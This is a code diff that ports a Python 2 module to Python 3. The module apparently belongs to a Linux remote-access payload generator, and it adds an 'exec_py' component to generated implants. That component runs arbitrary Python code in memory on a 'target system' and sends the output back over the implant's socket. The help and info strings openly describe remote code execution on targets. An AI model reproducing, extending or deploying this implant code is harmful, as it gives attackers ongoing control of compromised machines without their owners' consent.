@@ -1,4 +1,3 @@
-
 import library.modules.config as config
 import time
 
@@ -8,30 +7,30 @@ config.main()
 def main(option):
     if option == 'generate':
         config.import_statements.append('import sys')
-        config.import_statements.append('from StringIO import StringIO')
-        print config.war + 'Manual intervention required for python_execute component'
+        config.import_statements.append('from io import StringIO')
+        print(config.war + 'Manual intervention required for python_execute component')
         while True:
             try:
-                module_to_load = raw_input('\x1b[1m\x1b[37m[\x1b[0m\033[92m' +
+                module_to_load = input('\x1b[1m\x1b[37m[\x1b[0m\033[92m' +
                             '\x1b[1m\x1b[31mlinux/control/execute_python\x1b[0m' +
-                            '\x1b[1m\x1b[37m > ]\x1b[0m ' + 'Input name of other library to package into python_execute [CTRL-C to quit] : ')
+                            '\x1b[1m\x1b[37m > ]\x1b[0m ' +'Input name of other library to package into python_execute [CTRL-C to quit] : ')
                 if not module_to_load:
-                    print config.neg + 'Input the name of a module'
+                    print(config.neg + 'Input the name of a module')
                     continue
                 try:
                     exec ('import ' + module_to_load)
-                    print config.pos + 'Valid module, loaded on'
+                    print(config.pos + 'Valid module, loaded on')
                     config.import_statements.append('import ' + module_to_load)
                 except ImportError:
-                    print config.neg + 'Invalid module, not loaded on'
+                    print(config.neg + 'Invalid module, not loaded on')
             except EOFError:
                 try:
                     time.sleep(2)
                 except KeyboardInterrupt:
-                    print '\n' + config.pos + 'Done...'
+                    print('\n' + config.pos + 'Done...')
                     break
             except KeyboardInterrupt:
-                print config.pos + 'Done...'
+                print('\n' + config.pos + 'Done...')
                 break
         config.functions.append('''
 def exec_py(command):
@@ -45,7 +44,7 @@ def exec_py(command):
         result.write(str(e) + '\\n')
     sys.stdout = old_stdout
     result_string = result.getvalue()
-    s.sendall('[*]Result of code : \\n\\n' + result_string)
+    s.sendall(('[*]Result of code : \\n\\n' + result_string).encode())
 ''')
         config.logics.append('''
             elif command == "exec_py":
@@ -56,8 +55,8 @@ def exec_py(command):
         config.help_menu[
             'exec_py_file <Local file path>'] = 'Execute arbitrary python code from a file to execute on the target system in-memory'
     elif option == 'info':
-        print '\nName             : Execute python component' \
+        print('\nName             : Execute python component' \
               '\nOS               : Linux' \
-              '\nRequired Modules : StringIO, sys, <any module you can load in>' \
+              '\nRequired Modules : io, sys, <any module you can load in>' \
               '\nCommands         : exec_py <python command>' \
-              '\nDescription      : Execute in-memory arbitrary python code on the target system (remote interpreter that does not require python to be installed!)\n'
+              '\nDescription      : Execute in-memory arbitrary python code on the target system (remote interpreter that does not require python to be installed!)\n')
